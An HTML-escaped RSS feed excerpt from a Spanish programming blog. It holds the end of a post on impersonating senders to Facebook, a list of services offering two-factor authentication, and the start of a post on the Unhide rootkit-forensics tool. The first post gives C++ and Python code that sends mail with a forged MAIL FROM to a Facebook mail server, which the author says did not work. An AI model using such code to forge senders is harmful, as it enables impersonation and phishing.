    &lt;span class=&#34;n&#34;&gt;memcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sin_port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htons&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* SMTP PORT */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sockaddr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;n&#34;&gt;perror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;connecting stream socket&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;Connectedn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;cm&#34;&gt;/*=====Write some data then read some =====*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* SMTP Server logon string */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HELO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* introduce ourselves */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/*Read reply */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;MAIL FROM: &amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;rn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* Sender OK */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;VRFY &amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;rn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Sender OK */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;RCPT TO: &amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/*Mail to*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;rn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Recipient OK*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DATA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// body to follow*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;Subject: &amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Recipient OK*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wkstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;.rn&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;send_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;QUIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* quit */&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;read_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// log off */&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;//=====Close socket and finish=====*/&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;La versión en python:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;smtplib&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sender&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;xxxxx@xxxxx.com&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;receivers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;xxxxx@facebook.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;&amp;quot;&amp;quot;From: From Person&lt;/span&gt;
&lt;span class=&#34;s2&#34;&gt;To: To Person&lt;/span&gt;
&lt;span class=&#34;s2&#34;&gt;Subject: SMTP e-mail test&lt;/span&gt;
&lt;span class=&#34;s2&#34;&gt;This is a test e-mail message.&lt;/span&gt;
&lt;span class=&#34;s2&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;n&#34;&gt;smtpObj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smtplib&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SMTP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;69.171.244.12&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;n&#34;&gt;smtpObj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendmail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;receivers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;Successfully sent email&amp;quot;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;mail failed; &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# give a error message&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Esto es todo, por más que lo he intentado no lo he logrado, si os animáis a probarlo y lo conseguís, agradecería que lo comentárais.&lt;/p&gt;

&lt;h5 id=&#34;fuente-a-href-http-www-elladodelmal-com-2012-05-suplantacion-de-identidad-en-facebook-html-target-blank-elladodelmal-a&#34;&gt;Fuente: &lt;a href=&#34;http://www.elladodelmal.com/2012/05/suplantacion-de-identidad-en-facebook.html&#34; target=&#34;_blank&#34;&gt;Elladodelmal&lt;/a&gt;&lt;/h5&gt;

&lt;p&gt;&lt;/string&gt;&lt;/stdio&gt;&lt;/netdb&gt;&lt;/netinet&gt;&lt;/sys&gt;&lt;/iostream&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Todos los lugares donde deberías habilitar la Autenticación de Dos Factores ahora mismo</title>
            <link>https://elbauldelprogramador.com/todos-los-lugares-donde-deberias-habilitar-autenticacion-de-dos-factores-ahora-mismo/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/todos-los-lugares-donde-deberias-habilitar-autenticacion-de-dos-factores-ahora-mismo/</guid>
            <description>&lt;p&gt;La Autenticación de dos factores (Two-factor autenticación) es una de &lt;a href=&#34;http://lifehacker.com/5932501/strong-passwords-arent-enough-how-to-to-ensure-the-apple-and-amazon-exploit-never-happens-to-you&#34; target=&#34;_blank&#34;&gt;las mejores cosas que puedes hacer&lt;/a&gt; para asegurarte de que tus cuentas no sean hackeadas. Aquí hay una lista de todos los servicios populares que la ofrecen, y donde deberías ir para activarlo ahora mismo.&lt;/p&gt;

&lt;h2 id=&#34;qué-es-la-autenticación-de-dos-factores&#34;&gt;¿Qué es la Autenticación de Dos Factores?&lt;/h2&gt;

&lt;p&gt;Las contraseñas, desafortunadamente, &lt;a href=&#34;http://lifehacker.com/5937303/your-clever-password-tricks-arent-protecting-you-from-todays-hackers&#34; target=&#34;_blank&#34;&gt;no son tan seguras como solían serlo,&lt;/a&gt; y si alguien obtiene tu contraseña, puede acceder a tu cuenta sin problema. La Autenticación de Dos Factores soluciona ese problema.&lt;/p&gt;

&lt;div &gt;
&lt;span class=&#34;embed-youtube&#34; &gt;&lt;/span&gt;
&lt;/div&gt;

&lt;p&gt;El gurú del spam de Google, Matt Cutts, &lt;a href=&#34;http://lifehacker.com/5932700/please-turn-on-two+factor-authentication&#34; target=&#34;_blank&#34;&gt;lo expresa mejor&lt;/a&gt;: la Autenticación de dos factores es una simple característica que te pide más que solo tu contraseña. Requiere tanto &amp;#8220;algo que sabes&amp;#8221; (por ejemplo, una contraseña) como &amp;#8220;algo que tienes&amp;#8221; (por ejemplo, tu teléfono). Luego de ingresar tu contraseña, tendrás un segundo código enviado a tu teléfono, y solo después de ingresarlo podrás ingresar a tu cuenta. Piensa en esto como ingresar un numero de PIN, luego hacer un escaneo de retina, como ves en todas las películas de espías que existen. Es mucho mas seguro que una contraseña que puedes hackear, y mantiene a los fisgones no deseados alejados de tus cuentas online.
&lt;!--ad--&gt;&lt;/p&gt;

&lt;h2 id=&#34;dónde-puedo-usarla&#34;&gt;¿Dónde puedo usarla?&lt;/h2&gt;

&lt;p&gt;Desafortunadamente, no puedes usar autenticación de dos factores en cualquier parte de la web todavía. Pero muchos sitios la han implementado recientemente, incluyendo muchos de tus servicios favoritos. Aquí están algunos servicios que permiten autenticación de dos factores, con algunas instrucciones de cómo habilitarla:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; class=&#34;alignright&#34;  src=&#34;http://img.gawkerassets.com/img/17xdyo64drt8ujpg/original.jpg&#34; alt=&#34;&#34; /&gt;Google/Gmail:&lt;/strong&gt; La mayoría de nosotros guarda mucha información en nuestras cuentas de Google, y definitivamente querrás protegerla activando la autenticación de dos factores. Puedes aprender &lt;a href=&#34;http://lifehacker.com/5756977/set-up-googles-two+step-verification-now-for-seriously-enhanced-security-for-your-google-account&#34; target=&#34;_blank&#34;&gt;cómo hacerlo aquí,&lt;/a&gt; o checkear la &lt;a href=&#34;https://support.google.com/accounts/bin/answer.py?hl=en&amp;answer=185839&amp;topic=1056283&amp;ctx=topic&#34; target=&#34;_blank&#34;&gt;documentación oficial de Google&lt;/a&gt; para más información.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LastPass&lt;/strong&gt;: Si usas LastPass para crear, manejar, y guardar tus contraseñas de otros sitios (lo cual recomendamos que hagas), este es uno de los más importantes servicios para los cuales tienes que habilitar la autenticación de dos factores, dado que almacena tus contraseñas por cualquier otro sitio en la red. Usa la aplicación &lt;a href=&#34;http://code.google.com/p/google-authenticator/&#34; target=&#34;_blank&#34;&gt;Google Authenticator&lt;/a&gt; para Android, iOS y BlackBerry, y puedes leer &lt;a href=&#34;http://helpdesk.lastpass.com/security-options/google-authenticator/&#34; target=&#34;_blank&#34;&gt;cómo habilitarlo aquí&lt;/a&gt;. Alternativamente, puedes usar &lt;a href=&#34;http://lifehacker.com/5799036/the-best-password-utilities-that-dont-store-your-data-in-the-cloud&#34; target=&#34;_blank&#34;&gt;una de esas aplicaciones de gestión de contraseñas&lt;/a&gt; que sincronizan entre computadoras con Dropbox (que también soporta Autenticación de dos factores, como describimos a continuación.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Facebook&lt;/strong&gt;: Tener la contraseña de Facebook secuestrada puede ser más que sorprendente, y la autenticación de dos factores es muy fácil de usar. encontrarás instrucciones sobre &lt;a href=&#34;https://www.facebook.com/note.php?note_id=10150172618258920&#34; target=&#34;_blank&#34;&gt;cómo hacerlo aquí&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Dropbox&lt;/strong&gt;: Dropbox es&lt;a href=&#34;http://lifehacker.com/5933884/top-10-clever-uses-for-dropbox&#34; target=&#34;_blank&#34;&gt; útil por una gran cantidad de cosas&lt;/a&gt;, no solo por estar almacenando datos y &lt;a href=&#34;http://lifehacker.com/5910408/from-saucy-pics-to-passwords-how-to-share-sensitive-information-over-the-internet&#34; target=&#34;_blank&#34;&gt;enviando información sensible a través de Internet.&lt;/a&gt; Hazte un favor y &lt;a href=&#34;https://blog.dropbox.com/index.php/another-layer-of-security-for-your-dropbox-account/&#34; target=&#34;_blank&#34;&gt;activa la autenticación de dos factores utilizando estas instrucciones&lt;/a&gt;. Si quieres otra capa de seguridad adicional, puedes hacerlo &lt;a href=&#34;http://lifehacker.com/5794486/how-to-add-a-second-layer-of-encryption-to-dropbox&#34; target=&#34;_blank&#34;&gt;encriptando de los contenidos de tu Dropbox con TrueCrypt&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Algunos de los productos de Microsoft:&lt;/strong&gt; Microsoft no ha habilitado la autenticación de dos factores para Outlook aún, pero algunos de sus servicios - incluyendo Xbox Live, sus páginas de facturación, y SkyDrive cuando te conectas remotamente a otra computadora, lo requieren de forma predeterminada. Puedes leer más sobre ello &lt;a href=&#34;http://answers.microsoft.com/en-us/windowslive/forum/liveid-wlsecurity/two-factor-authentication-tfa-what-is-a-microsoft/79321863-cf01-44f3-a181-87f531c5129e&#34; target=&#34;_blank&#34;&gt;aquí&lt;/a&gt;. Y, si quieres una mejor seguridad para Outlook, debes saber que &lt;a href=&#34;http://lifehacker.com/5933768/remains-of-the-day-outlookcom-will-rival-gmails-two+factor-authentication&#34; target=&#34;_blank&#34;&gt;Microsoft está trabajando en una forma segura y fácil&lt;/a&gt; para fortalecer tu login.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Correo Yahoo!&lt;/strong&gt;: Si eres un usuario de Yahoo, puedes &lt;a href=&#34;http://www.zdnet.com/blog/security/yahoo-mail-introduces-two-factor-authentication/9846&#34; target=&#34;_blank&#34;&gt;activar la autenticación de dos factores&lt;/a&gt; para tu buzón.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Amazon Web Services&lt;/strong&gt;: Si utilizas cualquiera de los servicios web de Amazon, como Amazon S3 o el almacenamiento Glacier, puedes conseguir&lt;a href=&#34;http://aws.amazon.com/mfa/virtual_mfa_applications/?tag=gmgamzn-20&#34; target=&#34;_blank&#34;&gt; seguridad extra con Autenticación de Dos Factores&lt;/a&gt; a través de la aplicación Google Authenticator para Android, iOS y BlackBerry. También es compatible con Windows phone través de la aplicación &lt;a href=&#34;http://www.windowsphone.com/en-US/apps/021dd79f-0598-e011-986b-78e7d1fa76f8&#34; target=&#34;_blank&#34;&gt;Authenticator&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;: Si no quieres que nadie obtenga acceso no autorizado a tu blog, WordPress también es &lt;a href=&#34;http://wordpress.org/extend/plugins/google-authenticator/&#34; target=&#34;_blank&#34;&gt;compatible con la aplicación Google Authenticator&lt;/a&gt; para Android, iOS y BlackBerry.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DreamHost&lt;/strong&gt;: Si alojas tu propio dominio o el sitio web en DreamHost - nuestro servicio favorito de web hosting, puedes habilitar la autenticación de dos factores con Google Authenticator para Android, iOS y BlackBerry.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si utilizas cualquiera de estos servicios deberías habilitar autenticación de dos factores en este momento - es una de las mejores maneras de mantener tus datos (y, en muchos casos, tu dinero) seguros. Por supuesto, también deberías asegurarte de que utilizas una contraseña única y segura para cada una de tus cuentas, y si no lo haces, ya es b&lt;a href=&#34;http://lifehacker.com/5932501/strong-passwords-arent-enough-how-to-to-ensure-the-apple-and-amazon-exploit-never-happens-to-you&#34; target=&#34;_blank&#34;&gt;uen momento para cambiarlas&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Fuente | &lt;a href=&#34;http://lifehacker.com/5938565/heres-everywhere-you-should-enable-two+factor-authentication-right-now&#34; target=&#34;_blank&#34;&gt;lifehacker&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Unhide Forensic Tool: Encuentra puertos y procesos ocultos</title>
            <link>https://elbauldelprogramador.com/unhide-forensic-tool-encuentra-puertos-y-procesos-ocultos/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/unhide-forensic-tool-encuentra-puertos-y-procesos-ocultos/</guid>
            <description>&lt;figure&gt;
&lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2013/02/ghostbuster.jpg&#34; alt=&#34;Unhide Forensic Tool&#34; width=&#34;200px&#34; height=&#34;176px&#34; /&gt;
&lt;/figure&gt;

&lt;p&gt;Unhide Forensic Tool o simplemente &lt;strong&gt;&lt;em&gt;Unhide&lt;/em&gt;&lt;/strong&gt; es una herramienta forense que permite encontrar los procesos que ocultan los &lt;a href=&#34;https://es.wikipedia.org/wiki/Rootkit&#34; target=&#34;_blank&#34;&gt;RootKits&lt;/a&gt;, por módulos del kernel Linux o por otras técnicas.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Compara las salidas /proc frente a /bin/ps&lt;/li&gt;
&lt;li&gt;Compara la información adquirida a partir de /bin/ps con la información recopilada de procfs. &lt;strong&gt;Solo para versiones Linux 2.6&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Compara la información recopilada de /bin/ps con la información de las llamadas al sistema (syscall scannig).&lt;/li&gt;
&lt;li&gt;PIDs bruteforce. &lt;strong&gt;Solo para versiones Linux 2.6&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Está disponible tanto para &lt;a href=&#34;http://sourceforge.net/projects/unhide/files/latest/download?source=files&#34; target=&#34;_blank&#34;&gt;Windows&lt;/a&gt; como para &lt;a href=&#34;http://sourceforge.net/projects/unhide/files/&#34; target=&#34;_blank&#34;&gt;Linux&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Antes de usarlo es necesario compilarlo, cosa que logramos con los siguientes comandos:&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;gcc -Wall -O2 --static -pthread unhide-linux*.c unhide-output.c -o unhide-linux
gcc -Wall -O2 --static unhide_rb.c -o unhide_rb
gcc -Wall -O2 --static unhide-tcp.c unhide-tcp-fast.c unhide-output.c -o unhide-tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;unhide-tcp&lt;/strong&gt; es una herramienta forense que identifica puertos TCP/UDP a la escucha pero no están listados en &lt;a href=&#34;https://elbauldelprogramador.com/netstat-analizando-la-red-y-detectando-problemas/&#34;&gt;/bin/netstat&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Los posibles argumentos de cada herramienta son los siguientes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;./unhide-tcp --help
Unhide-tcp 20121229
Copyright © &lt;span class=&#34;m&#34;&gt;2012&lt;/span&gt; Yago Jesus &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Patrick Gouin
